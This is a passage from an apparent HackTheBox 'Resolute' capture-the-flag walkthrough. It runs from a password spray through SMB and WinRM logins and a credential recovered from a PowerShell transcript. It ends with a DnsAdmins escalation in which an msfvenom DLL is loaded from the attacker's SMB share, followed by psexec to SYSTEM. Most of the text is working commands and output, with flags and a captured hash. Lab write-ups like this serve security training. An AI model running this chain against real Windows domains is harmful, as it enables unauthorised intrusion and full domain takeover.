SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] MEGABANK\melanie:Welcome123! 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\simon:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] MEGABANK\naoki:Welcome123! STATUS_LOGON_FAILURE 


success: Melanie can log in to smb. Time to check if we can log in using win-rm

evil-winrm -i 10.10.10.169  -u melanie -p 'Welcome123!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents>


it works!!!


User flag:

*Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
a7ad91f8fec925ea22e7cfb893881aad


As we know from the results of enum4linux, there are other users on the machine:

*Evil-WinRM* PS C:\Users\melanie\Desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
abigail                  Administrator            angela
annette                  annika                   claire
claude                   DefaultAccount           felicia
fred                     Guest                    gustavo
krbtgt                   marcus                   marko
melanie                  naoki                    paulo
per                      ryan                     sally
simon                    steve                    stevie
sunita                   ulf                      zach
The command completed with one or more errors.



After looking over the home directory of melanie and not finding anything interesting, we move to root directory:

*Evil-WinRM* PS C:\> ls -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        3/28/2023   1:54 AM      402653184 pagefile.sys


going into PSTranscripts there is an interesting file;

*Evil-WinRM* PS C:\> gci -recurse -force -file PSTranscripts


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


while reading the file, there is a line that stands up:

PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!


we can now log in to ryan's account:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Resolute]
└─$ evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'                                                                                                                                  1 ⨯

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents> 


there is an interesting note on ryan's desktop:

*Evil-WinRM* PS C:\Users\ryan\Desktop> ls


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:34 AM            155 note.txt


*Evil-WinRM* PS C:\Users\ryan\Desktop> cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute


*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


Ryan is a part of DnsAdmins

Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.

The user ryan is found to be a member of DnsAdmins . Being a member of the DnsAdmins
group allows us to use the dnscmd.exe to specify a plugin DLL that should be loaded by the DNS
service. Let's create a DLL using msfvenom , that changes the administrator password
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll


copy the file using smbserver.py:

start the server:

sudo python3 smbserver.py share ./                                                                                                                                                         130 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.169,52352)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:5c29baf3604708b4116d2ba0dbdc077b:010100000000000080a6ca455a61d901605462eb693898f9000000000100100067006c007a0079004d005900660069000300100067006c007a0079004d005900660069000200100065004700650045006b004f00570073000400100065004700650045006b004f00570073000700080080a6ca455a61d901060004000200000008003000300000000000000000000000004000000f0abfdde3938984e02e0f7344aa1ffc93d95be306ee167707d1bf8dfb86a5050a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0035000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Closing down connection (10.10.10.169,52352)
[*] Remaining connections []

copy file:


*Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.5\share\da.dll
Registry property serverlevelplugindll successfully reset.
Command completed successfully.

now we need to stop and start the dns;
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2724
        FLAGS              :




and now we log in using psexec.py with the new password:
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 psexec.py megabank.local/administrator@10.10.10.169
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.169.....
[*] Found writable share ADMIN$
[*] Uploading file cQiCNlIx.exe
[*] Opening SVCManager on 10.10.10.169.....
[*] Creating service XjNq on 10.10.10.169.....
[*] Starting service XjNq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system



C:\Users\Administrator\Desktop>type root.txt
00d489e06517d564fefab6f346c3436d
